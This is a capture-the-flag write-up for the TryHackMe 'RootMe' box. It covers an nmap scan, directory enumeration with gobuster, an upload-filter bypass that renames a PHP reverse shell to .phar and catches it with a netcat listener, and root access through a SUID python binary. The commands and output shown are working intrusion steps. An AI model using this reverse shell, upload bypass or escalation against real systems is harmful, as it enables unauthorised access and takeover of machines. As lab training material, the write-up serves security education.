# CTF: [RootMe](https://tryhackme.com/room/rrootme)<br/>
## Notes
```
10.10.139.208

scan:
20 
80

found /panel and /uploads

upload php reverse shell
renamed extension from .php to .phar - bypasses file upload check

user.txt:THM{***_***_*_*****}

found /usr/bin/python interesting

python -c 'import os; os.execl("/bin/sh", "sh", "-p")' ---- If the binary has the SUID bit set, 
it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. 
If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.

root.txt:THM{*********_**********}
```
## nmap scan
```
# Nmap 7.91 scan initiated Tue Aug 24 02:20:22 2021 as: nmap -A -oN nmap.txt -v 10.10.139.208
Nmap scan report for 10.10.139.208
Host is up (0.13s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 4a:b9:16:08:84:c2:54:48:ba:5c:fd:3f:22:5f:22:14 (RSA)
|   256 a9:a6:86:e8:ec:96:c3:f0:03:cd:16:d5:49:73:d0:82 (ECDSA)
|_  256 22:f6:b5:a6:54:d9:78:7c:26:03:5a:95:f3:f9:df:cd (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: HackIT - Home
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.91%E=4%D=8/24%OT=22%CT=1%CU=44302%PV=Y%DS=3%DC=T%G=Y%TM=6124578
OS:6%P=x86_64-pc-linux-gnu)SEQ(SP=108%GCD=1%ISR=10A%TI=Z%CI=Z%II=I%TS=A)SEQ
OS:(SP=108%GCD=1%ISR=10A%TI=Z%CI=Z%TS=A)OPS(O1=M505ST11NW7%O2=M505ST11NW7%O
OS:3=NNT11%O4=M505ST11NW7%O5=M505ST11NW7%O6=M505ST11)WIN(W1=F4B3%W2=F4B3%W3
OS:=1EA%W4=F4B3%W5=F4B3%W6=F4B3)ECN(R=Y%DF=Y%T=40%W=F507%O=M505NNSNW7%CC=Y%
OS:Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40
OS:%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q
OS:=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=N)U1(R=Y%DF=N%T=40%IP
OS:L=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Uptime guess: 14.452 days (since Mon Aug  9 15:30:25 2021)
Network Distance: 3 hops
TCP Sequence Prediction: Difficulty=264 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 1025/tcp)
HOP RTT       ADDRESS
1   0.02 ms   172.17.0.1
2   176.86 ms 10.8.0.1
3   177.03 ms 10.10.139.208

Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Aug 24 02:20:54 2021 -- 1 IP address (1 host up) scanned in 32.47 seconds
```
## Hidden directories
According to our nmap scan, port 80 is open. Navigate to the address on a browser, look for hidden directories.
```
└─# gobuster dir -u 10.10.139.208 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -t 50 -x txt,html,php
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.139.208
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              html,php,txt
[+] Timeout:                 10s
===============================================================
2021/08/25 18:55:38 Starting gobuster in directory enumeration mode
===============================================================
/index.php            (Status: 200) [Size: 616]
/uploads              (Status: 301) [Size: 316] [--> http://10.10.139.208/uploads/]
/css                  (Status: 301) [Size: 312] [--> http://10.10.139.208/css/]    
/js                   (Status: 301) [Size: 311] [--> http://10.10.139.208/js/]     
/panel                (Status: 301) [Size: 314] [--> http://10.10.139.208/panel/]
```
`/panel` and `/uploads` look intersting. Let's investigate both directories.
## /panel
![thm_rootme_panel](https://user-images.githubusercontent.com/59718043/130849406-5938f5d6-7a99-4072-b2b4-eb86ee234718.png)
## /uploads
![thm_rootme_uploads](https://user-images.githubusercontent.com/59718043/130849622-c0bd32a5-7eb7-41ed-97c1-a423daee0533.png)
## Reverse Shell
Ideally, we could upload a file that will run a reverse shell connection, giving us shell access to the site. By running gobuster we found out that
the server runs PHP (index.php), this means we can upload [pentestmonkey's](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php)
PHP reverse shell script. Download the file and edit the script accordingly (change the IP and port number lines).
```
$ip = '127.0.0.1';  // CHANGE THIS
$port = 1234;       // CHANGE THIS
```
Save the file as `shell.phar`. We need to change the file extension from `.php` to `.phar` in order to bypass the file extension upload check.<br/><br/>
In `/panel`, upload the file. Now the script should appear in `/uploads`.<br/><br/>
Set up a netcat listener on your machine:
```
nc -nvlp 1234
```
Activate the shell script in `/uploads`.
<br/><br/>
By now you should get a connection on your netcat listener.
```
Listening on 0.0.0.0 1234
Connection received on 10.10.139.208 58738
Linux rootme 4.15.0-112-generic #113-Ubuntu SMP Thu Jul 9 23:41:39 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
 18:18:36 up 2 min,  0 users,  load average: 1.47, 1.08, 0.46
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$
```
Navigate to `/var/www` to view the first flag.

## Privilege escalation
Enumerate SUID binary files.
```
find / -perm -u=s -type f 2>/dev/null
```
`/usr/bin/python` looks interesting. Head over to [gtfobins](https://gtfobins.github.io/gtfobins/) to look for commands that we can use to abuse this vulnerability.
<br/><br/>
Execute this command to obtain root privilege.
```
python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
```
Navigate to `/root` to view the root flag.
